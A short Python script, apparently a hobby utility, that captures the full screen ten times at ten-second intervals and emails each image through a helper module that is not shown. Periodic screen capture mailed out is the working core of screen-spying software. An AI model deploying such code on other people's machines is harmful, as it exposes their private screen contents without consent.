from PIL import ImageGrab
import time

try:
    from .mail_image import  *
except ImportError:
    from mail_image import *

def get_image(path):
    pc_img = ImageGrab.grab()
    pc_img.save(path)

if __name__=='__main__':
    keep_path = "f:\\pc-image.jpg"
    for i in range(10):
        get_image(keep_path)
        send_image_mail(keep_path)
        time.sleep(10)
        print('Send...')
